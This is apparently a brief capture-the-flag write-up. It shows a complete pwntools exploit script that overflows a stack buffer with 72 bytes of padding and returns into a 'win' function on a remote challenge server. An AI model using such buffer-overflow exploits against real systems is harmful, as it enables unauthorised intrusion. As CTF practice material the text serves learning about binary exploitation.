I instantly recognized this from a chall on cyberedu and had an exploit script almost working already.
So i verified if the binary has symbols with objdump and i applied the following code:


from pwn import *

p = remote("ctf.ac.upt.ro", 9232)

elf = ELF("./challenge")
win = elf.symbols["win"]

payload  = b"A" * 72     
payload += p64(win)      

p.sendlineafter(b"Spune ceva:", payload)

p.interactive()


